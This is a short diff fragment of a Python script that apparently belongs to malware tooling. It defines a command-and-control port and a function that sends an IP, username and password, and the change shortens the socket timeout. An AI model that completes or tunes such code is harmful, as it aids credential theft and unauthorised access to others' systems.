@@ -5,7 +5,7 @@ C2PORT = 8989
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.settimeout(10) 
+s.settimeout(1) 
 
 def send(ip, usr, pw):
     try:
